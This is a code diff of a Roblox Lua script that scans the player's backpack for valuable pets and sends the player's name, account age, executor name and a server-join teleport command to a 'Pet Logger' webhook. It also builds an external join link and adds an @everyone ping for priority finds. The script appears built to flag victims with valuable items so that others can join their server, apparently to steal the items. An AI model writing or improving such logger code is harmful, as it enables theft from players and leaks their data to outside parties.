@@ -137,10 +137,19 @@ local backpackList, backpackValue, hasPriorityBackpack = collectPets(backpack)
 local totalValue = backpackValue
 local hasPriority = hasPriorityBackpack
 
-local targetWebhook = hasPriority and WEBHOOK_PRIORITY or WEBHOOK_NORMAL
-local pingText = "--@everyone\n".."game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..game.PlaceId..",\""..game.JobId.."\")"
+-- Determine webhook and ping
+local targetWebhook
+local pingText = ""
 
--- Build message with dynamic join URL (bold JobId)
+if hasPriority then
+    targetWebhook = WEBHOOK_PRIORITY
+    pingText = "@everyone\n".."game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..game.PlaceId..",\""..game.JobId.."\")"
+else
+    targetWebhook = WEBHOOK_NORMAL
+    pingText = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..game.PlaceId..",\""..game.JobId.."\")"
+end
+
+-- Build message with dynamic join URL
 local function buildDescription()
     local serverURL = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
     local desc = "```Name: "..player.Name.."\nExecutor: Delta\nAccount Age: "..player.AccountAge.." days```\n"
@@ -151,7 +160,7 @@ local function buildDescription()
     return desc
 end
 
--- SEND WEBHOOK
+-- Send webhook
 local payload = {
     content = pingText,
     username = "Pet Logger",
